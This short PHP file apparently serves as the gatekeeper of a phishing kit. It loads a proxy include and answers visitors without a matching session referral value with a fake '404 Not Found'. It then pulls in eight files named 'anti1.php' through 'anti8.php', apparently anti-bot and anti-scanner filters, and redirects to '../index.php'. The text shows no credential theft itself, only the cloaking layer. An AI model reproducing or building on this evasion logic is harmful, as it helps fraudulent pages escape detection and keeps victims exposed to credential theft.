<?php include'../../proxy.php';?><?php
if  (isset($_SESSION['refData'])){
if ($_SESSION['refData'] != $_SESSION['redirectlink']) {
        exit(header('HTTP/1.0 404 Not Found'));
    }
}else{
                exit(header('HTTP/1.0 404 Not Found'));
    }
  	require 'anti1.php';
	require 'anti2.php';
	require 'anti3.php';
	require 'anti4.php';
	require 'anti5.php';
	require 'anti6.php';
	require 'anti7.php';
	require 'anti8.php';
	exit(header("Location: ../index.php"));
?>